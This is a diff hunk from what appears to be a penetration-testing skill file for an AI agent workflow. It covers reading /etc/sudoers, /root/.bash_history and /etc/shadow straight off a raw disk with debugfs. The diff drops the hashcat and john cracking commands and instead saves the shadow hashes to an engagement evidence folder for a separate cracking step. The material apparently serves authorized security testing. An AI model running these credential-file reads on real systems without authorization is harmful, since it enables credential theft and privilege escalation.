@@ -468,14 +468,17 @@ debugfs /dev/sda1 -R 'cat /etc/sudoers' 2>/dev/null
 debugfs /dev/sda1 -R 'cat /root/.bash_history' 2>/dev/null
 ```
 
-**Crack extracted hashes:**
+**Save extracted hashes for cracking:**
 
 ```bash
-# Save shadow content to file, then:
-hashcat -m 1800 -a 0 shadow_hashes.txt wordlist.txt    # SHA-512
-hashcat -m 500 -a 0 shadow_hashes.txt wordlist.txt     # MD5
-john --wordlist=wordlist.txt shadow_hashes.txt
+# Save shadow content to evidence
+debugfs /dev/sda1 -R 'cat /etc/shadow' 2>/dev/null > engagement/evidence/shadow-hashes.txt
 ```
+
+**Do NOT crack hashes in this skill.** Save the shadow hashes to
+`engagement/evidence/` and return to the orchestrator with the hash file path,
+hash type (SHA-512 crypt / hashcat mode 1800, or MD5 crypt / mode 500), and a
+routing recommendation to **credential-cracking**.
 
 **Alternative — dd full filesystem:**
 
